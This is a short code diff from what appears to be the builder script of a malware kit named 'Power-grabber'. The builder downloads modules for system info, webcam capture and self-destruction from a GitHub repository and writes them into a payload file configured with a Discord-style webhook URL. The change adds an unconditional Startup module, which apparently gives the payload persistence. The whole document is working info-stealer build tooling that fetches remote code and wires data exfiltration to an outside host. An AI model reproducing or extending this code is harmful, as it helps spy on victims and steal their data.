@@ -97,9 +97,11 @@ if 'Self-destruction' in features:
 if 'System-Info' in features:
     system_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/System-Info.py').text.strip()
     combined_code += system_code + "\n" if system_code else ""
+Startup_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Startup.py').text.strip()
+combined_code += Startup_code + "\n" if Startup_code else ""
 if 'Webcam' in features:
     webcam_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Webcam.py').text.strip()
     combined_code += webcam_code + "\n" if webcam_code else ""
-final_code = f"webhook_url = {webhook_url}\nping_message = {ping_message}\n{ping}" + "\n".join(filter(None, combined_code.splitlines()))
+final_code = f"webhook_url = {webhook_url}\nping_message = {ping_message}{ping}" + "\n".join(filter(None, combined_code.splitlines()))
 with open(filename, 'w', encoding='utf-8') as grabber_file:
     grabber_file.write(final_code)
